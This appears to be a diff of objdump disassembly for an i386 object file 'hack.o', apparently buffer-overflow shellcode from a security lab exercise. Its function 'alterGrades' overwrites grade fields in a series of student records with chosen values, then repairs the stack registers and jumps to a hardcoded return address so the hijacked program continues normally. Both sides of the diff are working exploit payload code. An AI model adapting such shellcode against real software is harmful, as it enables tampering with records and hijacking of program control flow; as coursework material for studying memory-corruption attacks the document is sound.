@@ -5,49 +5,47 @@ hack.o:     file format elf32-i386
 Disassembly of section .text:
 
 00000000 <alterGrades>:
-   0:	bd d8 cf ff ff       	mov    $0xffffcfd8,%ebp
-   5:	bc 1b ce ff ff       	mov    $0xffffce1b,%esp
-   a:	55                   	push   %ebp
-   b:	89 e5                	mov    %esp,%ebp
-   d:	83 ec 10             	sub    $0x10,%esp
-  10:	8b 45 08             	mov    0x8(%ebp),%eax
-  13:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
-  1a:	8b 45 08             	mov    0x8(%ebp),%eax
-  1d:	05 90 01 00 00       	add    $0x190,%eax
-  22:	c7 40 40 50 00 00 00 	movl   $0x50,0x40(%eax)
-  29:	8b 45 08             	mov    0x8(%ebp),%eax
-  2c:	05 20 03 00 00       	add    $0x320,%eax
-  31:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
-  38:	8b 45 08             	mov    0x8(%ebp),%eax
-  3b:	05 b0 04 00 00       	add    $0x4b0,%eax
-  40:	c7 40 40 64 00 00 00 	movl   $0x64,0x40(%eax)
-  47:	8b 45 08             	mov    0x8(%ebp),%eax
-  4a:	05 40 06 00 00       	add    $0x640,%eax
-  4f:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  56:	8b 45 08             	mov    0x8(%ebp),%eax
-  59:	05 d0 07 00 00       	add    $0x7d0,%eax
-  5e:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  65:	8b 45 08             	mov    0x8(%ebp),%eax
-  68:	05 60 09 00 00       	add    $0x960,%eax
-  6d:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  74:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
-  7b:	8b 45 fc             	mov    -0x4(%ebp),%eax
-  7e:	69 d0 90 01 00 00    	imul   $0x190,%eax,%edx
-  84:	8b 45 08             	mov    0x8(%ebp),%eax
-  87:	01 d0                	add    %edx,%eax
-  89:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
-  90:	8b 45 08             	mov    0x8(%ebp),%eax
-  93:	05 80 0c 00 00       	add    $0xc80,%eax
-  98:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
-  9f:	8b 45 08             	mov    0x8(%ebp),%eax
-  a2:	05 10 0e 00 00       	add    $0xe10,%eax
-  a7:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
-  ae:	8b 45 08             	mov    0x8(%ebp),%eax
-  b1:	05 a0 0f 00 00       	add    $0xfa0,%eax
-  b6:	c7 40 40 5d 00 00 00 	movl   $0x5d,0x40(%eax)
-  bd:	c9                   	leave  
-  be:	bc b0 cf ff ff       	mov    $0xffffcfb0,%esp
-  c3:	bb 00 70 74 55       	mov    $0x55747000,%ebx
-  c8:	03 25 fc ff ff ff    	add    0xfffffffc,%esp
-  ce:	c7 04 24 92 87 04 08 	movl   $0x8048792,(%esp)
-  d5:	c3                   	ret    
+   0:	55                   	push   %ebp
+   1:	89 e5                	mov    %esp,%ebp
+   3:	c7 45 00 b8 da ff ff 	movl   $0xffffdab8,0x0(%ebp)
+   a:	83 ec 10             	sub    $0x10,%esp
+   d:	8b 45 08             	mov    0x8(%ebp),%eax
+  10:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
+  17:	8b 45 08             	mov    0x8(%ebp),%eax
+  1a:	05 90 01 00 00       	add    $0x190,%eax
+  1f:	c7 40 40 50 00 00 00 	movl   $0x50,0x40(%eax)
+  26:	8b 45 08             	mov    0x8(%ebp),%eax
+  29:	05 20 03 00 00       	add    $0x320,%eax
+  2e:	c7 40 40 5a 00 00 00 	movl   $0x5a,0x40(%eax)
+  35:	8b 45 08             	mov    0x8(%ebp),%eax
+  38:	05 b0 04 00 00       	add    $0x4b0,%eax
+  3d:	c7 40 40 64 00 00 00 	movl   $0x64,0x40(%eax)
+  44:	8b 45 08             	mov    0x8(%ebp),%eax
+  47:	05 40 06 00 00       	add    $0x640,%eax
+  4c:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  53:	8b 45 08             	mov    0x8(%ebp),%eax
+  56:	05 d0 07 00 00       	add    $0x7d0,%eax
+  5b:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  62:	8b 45 08             	mov    0x8(%ebp),%eax
+  65:	05 60 09 00 00       	add    $0x960,%eax
+  6a:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  71:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
+  78:	8b 45 fc             	mov    -0x4(%ebp),%eax
+  7b:	69 d0 90 01 00 00    	imul   $0x190,%eax,%edx
+  81:	8b 45 08             	mov    0x8(%ebp),%eax
+  84:	01 d0                	add    %edx,%eax
+  86:	c7 40 40 09 00 00 00 	movl   $0x9,0x40(%eax)
+  8d:	8b 45 08             	mov    0x8(%ebp),%eax
+  90:	05 80 0c 00 00       	add    $0xc80,%eax
+  95:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
+  9c:	8b 45 08             	mov    0x8(%ebp),%eax
+  9f:	05 10 0e 00 00       	add    $0xe10,%eax
+  a4:	c7 40 40 5f 00 00 00 	movl   $0x5f,0x40(%eax)
+  ab:	8b 45 08             	mov    0x8(%ebp),%eax
+  ae:	05 a0 0f 00 00       	add    $0xfa0,%eax
+  b3:	c7 40 40 5d 00 00 00 	movl   $0x5d,0x40(%eax)
+  ba:	c9                   	leave  
+  bb:	bb f4 af 70 55       	mov    $0x5570aff4,%ebx
+  c0:	83 c4 fc             	add    $0xfffffffc,%esp
+  c3:	c7 04 24 92 87 04 08 	movl   $0x8048792,(%esp)
+  ca:	c3                   	ret    
